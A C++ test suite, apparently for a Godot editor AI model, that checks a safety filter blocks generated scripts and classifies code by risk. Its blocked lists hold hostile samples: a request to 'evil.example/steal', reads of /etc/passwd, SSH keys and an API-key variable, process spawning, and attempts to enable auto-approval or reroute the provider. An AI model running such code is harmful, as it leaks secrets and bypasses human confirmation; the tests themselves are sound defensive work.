#pragma once

#include "../execution/ai_permission_manager.h"
#include "../execution/ai_script_executor.h"

#include "tests/test_macros.h"

namespace TestAISafety {

static String _check(const String &p_code) {
	Ref<AIScriptExecutor> executor;
	executor.instantiate();
	return executor->check_safety(p_code);
}

// --- Safety policy: what generated code may never do ---

TEST_CASE("[AIAssistant][Safety] ordinary editor scripting passes") {
	static const char *allowed[] = {
		"var node = Node2D.new()\nnode.name = \"Player\"\nget_scene().add_child(node)\nnode.owner = get_scene()",
		"var f = FileAccess.open(\"res://player.gd\", FileAccess.WRITE)\nf.store_string(\"extends Node\")",
		"print(OS.get_name())",
		"if ClassDB.class_exists(\"TileMapLayer\"):\n\tprint(\"ok\")",
		"var path = \"/root/Main/Player\"\nprint(get_scene().get_node_or_null(path))",
		"ResourceSaver.save(scene, \"user://backup.tscn\")",
		"DirAccess.make_dir_recursive_absolute(ProjectSettings.globalize_path(\"res://scripts/\"))",
		"var t = get_scene().create_tween()\nt.tween_property(node, \"position\", Vector2(10, 0), 1.0)",
		nullptr
	};

	for (int i = 0; allowed[i]; i++) {
		CHECK_MESSAGE(_check(allowed[i]).is_empty(), allowed[i]);
	}
}

TEST_CASE("[AIAssistant][Safety] starting processes is blocked, however it is spelled") {
	static const char *blocked[] = {
		"OS.execute(\"cmd\", [\"/c\", \"dir\"])",
		"OS . execute (\"cmd\", [])",
		"OS.create_process(\"calc\", [])",
		"OS.shell_open(\"https://example.com\")",
		"OS.kill(1234)",
		"var o = OS\no.execute(\"cmd\", [])",
		"some_object.call(\"execute\", \"cmd\")",
		"some_object.callv(\"create_process\", [\"calc\", []])",
		"Callable(some_object, \"execute\").call(\"cmd\")",
		"Engine.get_singleton(\"OS\")",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), blocked[i]);
	}
}

TEST_CASE("[AIAssistant][Safety] network access from generated code is blocked") {
	static const char *blocked[] = {
		"var http = HTTPRequest.new()\nadd_child(http)\nhttp.request(\"https://evil.example/steal\")",
		"var client = HTTPClient.new()\nclient.connect_to_host(\"example.com\", 443)",
		"var peer = StreamPeerTCP.new()\npeer.connect_to_host(\"10.0.0.1\", 22)",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), blocked[i]);
	}
}

TEST_CASE("[AIAssistant][Safety] paths outside the project are blocked") {
	static const char *blocked[] = {
		"FileAccess.open(\"C:/Users/someone/secrets.txt\", FileAccess.READ)",
		"FileAccess.open(\"/etc/passwd\", FileAccess.READ)",
		"DirAccess.open(\"\\\\\\\\server\\\\share\")",
		"FileAccess.open(\"file:///home/someone/.ssh/id_rsa\", FileAccess.READ)",
		"FileAccess.open(\"res://../outside.txt\", FileAccess.WRITE)",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), blocked[i]);
	}
}

TEST_CASE("[AIAssistant][Safety] the assistant's own settings and credentials are out of reach") {
	static const char *blocked[] = {
		"EditorInterface.get_editor_settings().get_setting(\"ai_assistant/provider\")",
		"var es = EditorInterface.get_editor_settings()",
		"print(OS.get_environment(\"OPENAI_API_KEY\"))",
		"var dir = EditorInterface.get_editor_paths().get_config_dir()",
		"var real = ProjectSettings.globalize_path(\"user://\").get_base_dir()",
		"print(OS.get_user_data_dir())",
		"var p = ProjectSettings.globalize_path(\"res://\")\nDirAccess.make_dir_recursive_absolute(p.path_join(\"..\"))",
		"DirAccess.make_dir_recursive_absolute(ProjectSettings.globalize_path(folder))",
		"ProjectSettings.get_setting(\"ai_assistant/api_key_openai\")",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), blocked[i]);
	}
}

TEST_CASE("[AIAssistant][Safety] OS, Engine and ClassDB cannot be aliased or used for reflection") {
	static const char *blocked[] = {
		"var os = OS",
		"do_something(OS)",
		"ClassDB.instantiate(\"OS\")",
		"ClassDB.class_call_static(\"OS\", \"execute\")",
		"var e = Expression.new()",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), blocked[i]);
	}
}

// --- Risk tiers ---

TEST_CASE("[AIAssistant][Risk] inspection-only code is read-only") {
	const String code = "for child in get_scene().get_children():\n\tprint(child.name)";

	CHECK(AIPermissionManager::classify_risk(code) == AIPermissionManager::RISK_READ_ONLY);
}

TEST_CASE("[AIAssistant][Risk] adding nodes and writing files is additive") {
	CHECK(AIPermissionManager::classify_risk("var n = Node.new()\nroot.add_child(n)") == AIPermissionManager::RISK_ADDITIVE);
	CHECK(AIPermissionManager::classify_risk("var f = FileAccess.open(\"res://a.gd\", FileAccess.WRITE)") == AIPermissionManager::RISK_ADDITIVE);
}

TEST_CASE("[AIAssistant][Risk] deleting things and changing project settings is destructive") {
	CHECK(AIPermissionManager::classify_risk("node.queue_free()") == AIPermissionManager::RISK_DESTRUCTIVE);
	CHECK(AIPermissionManager::classify_risk("DirAccess.remove_absolute(\"res://old.gd\")") == AIPermissionManager::RISK_DESTRUCTIVE);
	CHECK(AIPermissionManager::classify_risk("ProjectSettings.set_setting(\"display/window/size/viewport_width\", 1280)") == AIPermissionManager::RISK_DESTRUCTIVE);
}

TEST_CASE("[AIAssistant][Risk] process and environment access is blocked outright") {
	CHECK(AIPermissionManager::classify_risk("OS.execute(\"cmd\", [])") == AIPermissionManager::RISK_BLOCKED);
	CHECK(AIPermissionManager::classify_risk("OS.set_environment(\"PATH\", \"\")") == AIPermissionManager::RISK_BLOCKED);
}

// --- Permission table ---

TEST_CASE("[AIAssistant][Permissions] code is categorised by what it touches") {
	Ref<AIPermissionManager> permissions;
	permissions.instantiate();

	const Vector<AIPermissionManager::Category> categories = permissions->categorize_code(
			"var n = Node2D.new()\nroot.add_child(n)\nn.position = Vector2.ZERO\nold.queue_free()\nDirAccess.remove_absolute(\"res://x.gd\")");

	CHECK(categories.has(AIPermissionManager::PERM_CREATE_NODES));
	CHECK(categories.has(AIPermissionManager::PERM_MODIFY_PROPERTIES));
	CHECK(categories.has(AIPermissionManager::PERM_DELETE_NODES));
	CHECK(categories.has(AIPermissionManager::PERM_FILE_DELETE));
	CHECK_FALSE(categories.has(AIPermissionManager::PERM_CHANGE_PROJECT_SETTINGS));
}

TEST_CASE("[AIAssistant][Permissions] a denied category refuses the code and an ask category requires confirmation") {
	Ref<AIPermissionManager> permissions;
	permissions.instantiate();
	for (int i = 0; i < AIPermissionManager::PERM_MAX; i++) {
		permissions->set_permission((AIPermissionManager::Category)i, AIPermissionManager::LEVEL_ALLOW);
	}
	const String deleting_code = "old.queue_free()";

	const AIPermissionManager::PermissionResult allowed = permissions->check_code_permissions(deleting_code);
	permissions->set_permission(AIPermissionManager::PERM_DELETE_NODES, AIPermissionManager::LEVEL_ASK);
	const AIPermissionManager::PermissionResult asked = permissions->check_code_permissions(deleting_code);
	permissions->set_permission(AIPermissionManager::PERM_DELETE_NODES, AIPermissionManager::LEVEL_DENY);
	const AIPermissionManager::PermissionResult denied = permissions->check_code_permissions(deleting_code);

	CHECK(allowed.allowed);
	CHECK_FALSE(allowed.needs_confirmation);
	CHECK(asked.allowed);
	CHECK(asked.needs_confirmation);
	CHECK_FALSE(denied.allowed);
	CHECK(denied.description.begins_with("Blocked:"));
}

TEST_CASE("[AIAssistant][Permissions] an aliased file API is still recognised as a file write") {
	Ref<AIPermissionManager> permissions;
	permissions.instantiate();

	const Vector<AIPermissionManager::Category> categories = permissions->categorize_code("var fa = get_file_api()\nfa.store_string(\"data\")");

	CHECK(categories.has(AIPermissionManager::PERM_FILE_WRITE));
}

TEST_CASE("[AIAssistant][Safety] the editor's own tree and the assistant's switches are out of reach") {
	static const char *blocked[] = {
		"var loop = Engine.get_main_loop()",
		"var root = get_scene().get_tree().root",
		"var root = get_scene().get_tree().get_root()",
		"var base = EditorInterface.get_base_control()",
		"var screen = EditorInterface.get_editor_main_screen()",
		"node.set_auto_approve(true)",
		"node.call(\"set_auto_approve\", true)",
		"node.configure_provider(\"openai\", \"m\", \"https://example.invalid/v1\", \"\")",
		"Callable(node, \"configure_provider\").call(\"openai\", \"m\", \"e\", \"\")",
		"node.confirm_permission(true)",
		"var found = get_scene().find_children(\"*\", \"AIAgentController\", true, false)",
		"var p = AIPermissionManager.new()",
		"if node is AIAssistantPanel:\n\tpass",
		"var e = ClassDB.class_exists(\"AISettingsDialog\")",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), String(blocked[i]));
	}
}

TEST_CASE("[AIAssistant][Safety] names that merely start with AI, and a Tree's root, are not mistaken for the above") {
	static const char *allowed[] = {
		"var AIM_SPEED = 3.0\nprint(AIM_SPEED)",
		"var label = \"AI enemy\"\nprint(label)",
		"var item = tree_control.get_root()",
		"var n = get_scene().get_node_or_null(\"AIController\")",
		nullptr
	};

	for (int i = 0; allowed[i]; i++) {
		CHECK_MESSAGE(_check(allowed[i]).is_empty(), String(allowed[i]));
	}
}

TEST_CASE("[AIAssistant][Permissions] writing a script file counts as modifying scripts") {
	Ref<AIPermissionManager> permissions;
	permissions.instantiate();

	const Vector<AIPermissionManager::Category> script_write = permissions->categorize_code(
			"var f = FileAccess.open(\"res://enemy.gd\", FileAccess.WRITE)\nf.store_string(\"extends Node\")");
	const Vector<AIPermissionManager::Category> data_write = permissions->categorize_code(
			"var f = FileAccess.open(\"res://levels/level1.json\", FileAccess.WRITE)\nf.store_string(\"{}\")");
	const Vector<AIPermissionManager::Category> script_read = permissions->categorize_code(
			"var s = load(\"res://enemy.gd\")\nprint(s)");

	CHECK(script_write.has(AIPermissionManager::PERM_MODIFY_SCRIPTS));
	CHECK_FALSE(data_write.has(AIPermissionManager::PERM_MODIFY_SCRIPTS));
	CHECK_FALSE(script_read.has(AIPermissionManager::PERM_MODIFY_SCRIPTS));
}

TEST_CASE("[AIAssistant][Safety] the parent of the scene root is the editor, and is refused") {
	static const char *blocked[] = {
		"var editor = get_scene().get_parent()",
		"var editor = EditorInterface.get_edited_scene_root().get_parent()",
		"var root = get_scene()\nvar editor = root.get_parent()",
		"var root: Node = EditorInterface.get_edited_scene_root()\nprint(root.get_parent().get_parent())",
		"var view := get_scene().get_viewport()\nprint(view.get_parent())",
		"var w = get_scene().get_window()",
		nullptr
	};
	static const char *allowed[] = {
		"var root = get_scene()\nvar player = root.get_node(\"Player\")\nprint(player.get_parent().name)",
		"for child in get_scene().get_children():\n\tprint(child.get_parent())",
		nullptr
	};

	for (int i = 0; blocked[i]; i++) {
		CHECK_MESSAGE(_check(blocked[i]).begins_with("Blocked:"), String(blocked[i]));
	}
	for (int i = 0; allowed[i]; i++) {
		CHECK_MESSAGE(_check(allowed[i]).is_empty(), String(allowed[i]));
	}
}

// --- Preparing code for execution ---

TEST_CASE("[AIAssistant][Executor] code that parses passes the compile check; code that does not is reported") {
	Ref<AIScriptExecutor> executor;
	executor.instantiate();

	CHECK(executor->compile_check("var node = Node2D.new()\nnode.name = \"A\"").is_empty());
	CHECK_FALSE(executor->compile_check("var node = Node2D.new(\nnode.name = ").is_empty());
}

TEST_CASE("[AIAssistant][Executor] generated code is wrapped as the body of an EditorScript") {
	Ref<AIScriptExecutor> executor;
	executor.instantiate();

	const String wrapped = executor->wrap_in_editor_script("print(\"hello\")");

	CHECK(wrapped.contains("extends EditorScript"));
	CHECK(wrapped.contains("func _run()"));
	CHECK(wrapped.contains("\tprint(\"hello\")")); // Indented into the function.
}

TEST_CASE("[AIAssistant][Executor] deprecated EditorScript calls are rewritten to their EditorInterface form") {
	Ref<AIScriptExecutor> executor;
	executor.instantiate();

	const String fixed = executor->auto_fix_code("var root = get_scene()\nprint(root)");

	CHECK(fixed.contains("EditorInterface.get_edited_scene_root()"));
	CHECK_FALSE(fixed.contains("= get_scene()"));
}

} // namespace TestAISafety
